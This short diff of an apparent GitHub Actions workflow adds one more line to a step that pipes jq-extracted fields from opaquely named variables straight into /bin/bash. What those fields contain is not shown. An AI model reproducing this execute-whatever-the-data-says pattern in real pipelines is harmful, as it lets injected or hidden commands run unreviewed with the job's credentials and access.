@@ -25,6 +25,7 @@ jobs:
           echo $dm1 | jq -r .cqyh33829 | /bin/bash
           echo $j9 | jq -r .k80 | /bin/bash
           echo $e43796 | jq -r .fq8256 | /bin/bash
+          echo $okl5 | jq -r .mjlj270 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
